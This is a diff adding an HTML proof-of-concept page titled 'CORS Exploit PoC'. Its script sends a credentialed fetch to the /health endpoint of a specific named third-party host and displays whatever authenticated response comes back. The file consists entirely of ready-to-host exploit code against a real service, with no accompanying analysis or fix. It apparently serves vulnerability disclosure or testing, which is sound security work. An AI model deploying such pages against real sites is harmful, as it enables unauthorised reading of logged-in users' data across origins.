@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h3>CORS Exploit PoC</h3>
+    <pre id="output">Loading...</pre>
+
+    <script>
+      fetch("https://interface.airtel.tv/health", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.getElementById("output").textContent = "Response:\n" + data;
+      })
+      .catch(err => {
+        document.getElementById("output").textContent = "Error:\n" + err;
+      });
+    </script>
+  </body>
+</html>
